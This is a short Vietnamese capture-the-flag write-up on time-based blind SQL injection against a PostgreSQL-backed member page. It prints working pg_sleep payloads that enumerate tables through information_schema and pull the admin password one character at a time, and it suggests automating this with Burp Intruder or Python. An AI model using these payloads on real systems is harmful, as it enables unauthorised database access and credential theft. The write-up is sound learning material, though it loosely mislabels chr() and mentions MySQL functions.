- tiêu đề : SQL injection - Time based = docter stranger
- nội dung : lại là lấy mật khẩu admin thui 

- NOTE : vì mình làm qua rồi nên sẽ đi thằng vào chỗ bị SQLi luôn nhé 

- trước tiên view qua thì có 2 trang là login và member 
- đại khái login không bị SQLi mình test qua là thế 
- thằng member dùng để xem thông tin thành viên ( nhưng éo cho xem :> ) 

![Alt text](<../image/34.2.png>)

![Alt text](<../image/34.1.png>)

- mình thử inject với PG_SLEEP() tại member=1 và thành công chứng mình bị SQLi 

![Alt text](<../image/34.3.png>)

- okay có dữ kiện mà điều kiện òi phang th 
- mình sẽ làm tựa như bài SQL blind để check ký tự của password ( ví dụ : a% )

- NOTE : thật ra là ae phải tìm tên bảng và tên cột trước nhé . mình tìm rồi nên biết nó là cột password trong bảng users 

----------TÌM BẢNG , CỘT--------------

- 3;select+case+when+((select+length(table_name)+from+information_schema.tables+limit+1)=[length])+then+pg_sleep(10)+else+pg_sleep(-1)+end—

  + lấy độ dài của table đầu tiên và xem nó là bao nhiêu , thì [length] là dộ dài được so sánh ( sẽ thay đổi để brute force độ dài ) 
            
- 3;select+case+when+(substr((select+table_name+from+information_schema.tables+limit+1),§1§,1)=chr(§§))+then+pg_sleep(10)+else+pg_sleep(-1)+end--

   + cái này thì nó dùng substr để cắt lấy ký tự thứ bao nhiêu trong table_name đầu tiên và so sánh với chr() -- thì chr(100) là cái kiểu bash64 biểu thị chữ d

- NOTE : may mắn là users là bảng đầu tiên nếu không phải thì ae bruteforce đến tết năm sau ( thêm OFFSET vào cuối để xét bảng sau nhé )
--------------------------------------

- còn đây là lệnh mình dùng sau khi làm các bước trên 

- -1;SELECT+CASE+WHEN+password+LIKE+'a%'+THEN+(SELECT+PG_SLEEP(10))+END+AS+result+FROM+users+WHERE+username='admin';--a 
-  nếu password có chữ a đứng đầu thì ngủ không thì thôi 

- đoạn này ae dùng intruder hoặc code lại bằng py đều được
- Mình cũng đã hướng dẫn ở bài SQLi blind rồi ae chịu khó đọc lại nhé 

#hackerga2101: 
- tìm hiểu 1 số hàm hỗ trợ trong mysql như: length, substr, group_concat, cast, ...
- và các option select: limit, offset, ... 